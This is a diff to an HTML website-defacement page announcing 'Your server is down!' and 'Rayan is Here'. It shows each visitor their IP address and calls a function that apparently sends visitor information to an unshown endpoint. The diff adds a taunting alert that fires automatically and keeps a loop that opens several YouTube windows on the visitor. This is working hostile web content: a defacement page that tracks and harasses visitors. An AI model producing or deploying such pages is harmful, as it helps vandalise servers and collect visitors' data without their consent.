@@ -15,7 +15,7 @@
       height: 100%;
       overflow: hidden;
       font-family: Arial, sans-serif;
-      cursor: default; /* ✅ يظهر الماوس */
+      cursor: default;
     }
 
     .video-bg {
@@ -40,7 +40,7 @@
       transform: translate(-50%, -50%);
       text-align: center;
       color: white;
-      z-index: 1; /* ✅ تأكيد أن الزر فوق الفيديو */
+      z-index: 1;
     }
 
     .hacked-message {
@@ -54,22 +54,6 @@
       color: #ff4d4d;
       font-size: 1.2em;
       margin-top: 10px;
-    }
-
-    button {
-      margin-top: 20px;
-      padding: 8px 16px;
-      background-color: #a30000;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-      font-size: 1em;
-    }
-
-    button:hover {
-      background-color: #ff0000;
     }
   </style>
 </head>
@@ -89,7 +73,6 @@
     <p>Oops! Your server is down!</p>
     <p>Rayan is Here</p>
     <div class="ip-address" id="ip-address">Your IP: Loading...</div>
-    <button onclick="alert('Rayan 3mk')">Who am I?</button>
   </div>
 
   <!-- موسيقى -->
@@ -97,7 +80,7 @@
     <source src="https://audio.jukehost.co.uk/5vlKJX8Q0vxc3vTxevG0iPvv4sU2pEda" type="audio/mpeg">
   </audio>
 
-  <!-- سكربت IP + نوافذ يوتيوب -->
+  <!-- سكربت IP + الرسالة التلقائية + يوتيوب -->
   <script>
     async function sendVisitorInfo() {
       try {
@@ -113,6 +96,12 @@
     window.onload = function () {
       sendVisitorInfo();
 
+      // ❗ الرسالة تظهر تلقائيًا بعد 2 ثانية
+      setTimeout(() => {
+        alert('Rayan 3mk');
+      }, 2000);
+
+      // فتح نوافذ يوتيوب بعد 5 ثواني
       setTimeout(() => {
         const videoUrl = 'https://www.youtube.com/watch?v=QlK8TFTUAMI';
         for (let i = 0; i < 5; i++) {
